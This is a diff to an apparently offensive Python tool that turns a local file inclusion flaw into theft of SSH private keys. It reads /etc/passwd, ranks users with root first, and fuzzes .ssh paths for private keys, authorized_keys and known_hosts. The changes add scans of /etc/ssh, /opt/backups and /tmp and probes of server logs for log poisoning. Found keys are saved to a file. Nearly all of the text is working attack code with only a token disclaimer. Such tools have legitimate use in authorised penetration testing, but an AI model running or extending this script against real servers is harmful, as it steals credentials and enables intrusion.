@@ -18,7 +18,7 @@ RESET = "\033[0m"
 BANNER = f"""
   _    ___ ___ ___ _  _______   _____ 
  | |  | __|_ _|_  ) |/ / __\\ \\ / / __|
- | |__| _| | | / /|   <| _| \\ V /\\__ \\
+ | |__| _| | | / /| ' <| _| \\ V /\\__ \\
  |____|_| |___/___|_|\\_\\___| |_| |___/
                                       
 LFI to SSH Private Keys - Automated Looting Script
@@ -52,6 +52,15 @@ def get_session(proxy):
         print(f"{ORANGE}[*]{RESET} Proxy mode enabled; requests will be processed sequentially with a 1s delay.")
     return session
 
+def is_valid_shell(shell):
+    shell_lower = shell.lower()
+    # List of known non-interactive shells
+    non_interactive_shells = ["/bin/false", "/bin/sync", "/usr/sbin/nologin", "/sbin/nologin"]
+    # Check if the shell exactly matches a non-interactive shell or contains 'nologin'
+    if shell_lower in non_interactive_shells or "nologin" in shell_lower:
+        return False
+    return True
+
 def check_passwd_file(url, proxy, verbose):
     session = get_session(proxy)
     try:
@@ -73,13 +82,17 @@ def extract_active_users(passwd_content, verbose=False):
         parts = line.split(":")
         if len(parts) < 7:
             continue
-        username, _, _, _, _, home_dir, shell = parts
-        if home_dir.startswith("/home/") and not shell.endswith("nologin"):
-            valid_users.append((username, home_dir))
+        username, _, uid_str, _, _, home_dir, shell = parts
+        try:
+            uid = int(uid_str)
+        except:
+            uid = 9999
+        if home_dir and is_valid_shell(shell):
+            valid_users.append((username, home_dir, uid))
     if valid_users:
         print(f"{GREEN}[+]{RESET} Valid users exported:")
-        for user, home in valid_users:
-            print("    {} -> {}".format(user, home))
+        for user, home, uid in valid_users:
+            print("    {} -> {} (UID: {})".format(user, home, uid))
         return valid_users
     print(f"{RED}[-]{RESET} No valid users found")
     return []
@@ -120,13 +133,13 @@ def check_ssh_metadata(base_url, users, proxy, verbose=False):
     session = get_session(proxy)
     prefix = base_url.rsplit("etc/passwd", 1)[0]
     found_ssh_users = set()
-    for user, home in users:
+    for user, home, _ in users:
         ak_path = f"{home}/.ssh/authorized_keys"
         ak_payload = prefix + ak_path.lstrip("/")
         try:
             response = session.get(ak_payload, timeout=10)
             if response.status_code == 200 and response.text.strip():
-                print(f"{ORANGE}[!]{RESET} Found authorized_keys for {user}: {ak_payload}")
+                print(f"{RED}[!]{RESET} Found authorized_keys for {user}: {ak_payload}")
                 found_ssh_users.add(user)
         except requests.RequestException as e:
             if verbose:
@@ -136,7 +149,7 @@ def check_ssh_metadata(base_url, users, proxy, verbose=False):
         try:
             response = session.get(kh_payload, timeout=10)
             if response.status_code == 200 and response.text.strip():
-                print(f"{ORANGE}[!]{RESET} Found known_hosts for {user}: {kh_payload}")
+                print(f"{RED}[!]{RESET} Found known_hosts for {user}: {kh_payload}")
         except requests.RequestException as e:
             if verbose:
                 print(f"{RED}[-]{RESET} Error checking known_hosts for {user} at {kh_payload}: {e}")
@@ -161,13 +174,14 @@ def fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_as_succe
         candidates.append(f"{home}/.ssh/{key_name}")
         if all_flag:
             candidates.append(f"{home}/{key_name}")
+    # Remove duplicates while preserving order
     candidates = list(dict.fromkeys(candidates))
     if session.proxies:
         for candidate in candidates:
             candidate_url = prefix + candidate.lstrip("/")
             result = fuzz_task(user, candidate_url, session, verbose)
             if result:
-                print(f"{GREEN}[+]{RESET} Private key found for {user} at: {result[0]}")
+                print(f"{RED}[!]{RESET} Private key found for {user} at: {result[0]}")
                 found.append(result)
                 if not continue_as_success:
                     break
@@ -181,10 +195,12 @@ def fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_as_succe
             for future in as_completed(future_to_candidate):
                 result = future.result()
                 if result:
-                    print(f"{GREEN}[+]{RESET} Private key found for {user} at: {result[0]}")
+                    print(f"{RED}[!]{RESET} Private key found for {user} at: {result[0]}")
                     found.append(result)
                     if not continue_as_success:
                         break
+    if verbose and not found:
+        print(f"{ORANGE}[DEBUG]{RESET} No keys found for {user}, moving to next user.")
     return found
 
 def fuzz_ssh_keys_for_users(base_url, users, wordlist, proxy, all_flag, continue_as_success, verbose, found_ssh_users):
@@ -192,11 +208,53 @@ def fuzz_ssh_keys_for_users(base_url, users, wordlist, proxy, all_flag, continue
     found_keys = []
     session = get_session(proxy)
     prefix = base_url.rsplit("etc/passwd", 1)[0]
-    ordered_users = sorted(users, key=lambda x: 0 if x[0] in found_ssh_users else 1)
-    for user, home in ordered_users:
+    ordered_users = sorted(users, key=lambda x: (0 if x[0] in found_ssh_users else 1,
+                                                  0 if x[2] == 0 else (x[2] if x[2] < 1000 else 10000)))
+    for user, home, _ in ordered_users:
         keys = fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_as_success, verbose)
         found_keys.extend(keys)
     return found_keys
+
+def fuzz_additional_paths(base_url, proxy, verbose, wordlist):
+    extra_dirs = ["/etc/ssh/", "/opt/backups/", "/tmp/"]
+    log_files = ["/var/log/auth.log", "/var/log/apache2/access.log", "/var/log/syslog",
+                 "/var/log/vsftpd.log", "/var/log/apache/error.log", "/var/log/main.log", "/var/log/nginx/error.log"]
+    found = []
+    session = get_session(proxy)
+    prefix = base_url.rsplit("etc/passwd", 1)[0]
+    print(f"{GREEN}[+]{RESET} Scanning additional directories for SSH keys using wordlist...")
+    for directory in extra_dirs:
+        for key_name in wordlist:
+            candidate_path = directory.rstrip("/") + "/" + key_name
+            candidate_url = prefix + candidate_path.lstrip("/")
+            try:
+                response = session.get(candidate_url, timeout=10)
+                if response.status_code == 200 and "PRIVATE KEY" in response.text:
+                    if verbose:
+                        print(f"{ORANGE}[DEBUG]{RESET} Private key content from {candidate_url}:\n{response.text}")
+                    print(f"{RED}[!]{RESET} Private key found in additional directory: {candidate_url}")
+                    found.append((candidate_url, response.text))
+            except Exception as e:
+                if verbose:
+                    print(f"{RED}[-]{RESET} Error checking {candidate_url}: {e}")
+    print(f"{GREEN}[+]{RESET} Scanning log files for possible log poisoning...")
+    log_found = False
+    for path in log_files:
+        candidate_url = prefix + path.lstrip("/")
+        try:
+            response = session.get(candidate_url, timeout=10)
+            if response.status_code == 200 and len(response.text) > 50:
+                print(f"{RED}[!]{RESET} Log file found: {candidate_url} - this file may be used for log poisoning if writable.")
+                log_found = True
+            else:
+                if verbose:
+                    print(f"{ORANGE}[DEBUG]{RESET} No accessible log file at: {candidate_url}")
+        except Exception as e:
+            if verbose:
+                print(f"{RED}[-]{RESET} Error checking log file at {candidate_url}: {e}")
+    if not log_found:
+        print(f"{GREEN}[+]{RESET} No accessible log files detected for log poisoning.")
+    return found
 
 def main():
     parser = argparse.ArgumentParser(
@@ -208,12 +266,14 @@ def main():
     parser.add_argument("-o", "--output", help="File to save found private key URLs and contents", default=None)
     parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for debugging")
-    parser.add_argument("-a", "--all", action="store_true", help="Also search the entire home directory (not just .ssh folder)")
-    parser.add_argument("-c", "--continue-on-success", action="store_true",
+    parser.add_argument("-a", "--all", action="store_true", help="Also search the entire home directory and additional paths")
+    parser.add_argument("-c", "--continue-as-success", action="store_true",
                         help="Continue scanning all users for private keys even after a match is found")
     args = parser.parse_args()
 
     print(BANNER)
+    print(f"{ORANGE}[*]{RESET} The script provided is for educational purposes only, I am not responsible for your actions.")
+
     passwd_content = check_passwd_file(args.url, args.proxy, args.verbose)
     if not passwd_content:
         sys.exit(f"{RED}[-]{RESET} Exiting due to invalid /etc/passwd response")
@@ -229,7 +289,12 @@ def main():
             key_wordlist = [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
         sys.exit(f"{RED}[-]{RESET} Wordlist file '{args.list}' not found")
-    found_keys = fuzz_ssh_keys_for_users(args.url, valid_users, key_wordlist, args.proxy, args.all, args.continue_on_success, args.verbose, found_ssh_users)
+    found_keys = fuzz_ssh_keys_for_users(args.url, valid_users, key_wordlist, args.proxy, args.all, args.continue_as_success, args.verbose, found_ssh_users)
+    
+    if args.all:
+        extra_found = fuzz_additional_paths(args.url, args.proxy, args.verbose, key_wordlist)
+        found_keys.extend(extra_found)
+    
     if args.output and found_keys:
         with open(args.output, "w") as f:
             for url, key_content in found_keys:
